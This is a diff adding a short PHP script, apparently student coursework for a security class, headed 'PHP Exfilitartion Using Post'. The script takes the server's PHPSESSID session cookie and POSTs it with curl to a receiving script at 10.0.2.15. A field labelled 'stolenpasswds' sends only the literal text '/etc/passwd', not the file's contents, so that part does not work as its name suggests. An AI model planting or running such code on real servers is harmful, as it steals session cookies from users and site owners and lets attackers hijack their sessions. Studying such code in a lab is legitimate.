@@ -1,0 +1,28 @@
+<?php
+//Kyle Healy
+//CPSC62700 - Week 6 PHP Exfilitartion Using Post
+//phpinfo script to be sent to run on server
+
+//url of receiving script
+$url = 'http://10.0.2.15/saveinfo.php';
+if(isset($_COOKIE['PHPSESSID'])) 
+{
+    $phpsessidCookie = $_COOKIE['PHPSESSID'];
+}
+
+$mycookies = 'cookie=' . $phpsessidCookie . '&stolenpasswds=/etc/passwd';
+
+$conn = curl_init($url);
+curl_setopt($conn, CURLOPT_CONNECTTIMEOUT, 5);
+curl_setopt($conn, CURLOPT_POST, 1);
+curl_setopt($conn, CURLOPT_POSTFIELDS, $mycookies);
+curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($conn, CURLOPT_HEADER, 0);
+curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+
+$response = curl_exec($conn);
+//print_r(curl_getinfo($conn));
+curl_close($conn);
+
+echo "<pre>response: \n $response \n</pre>";
+?>
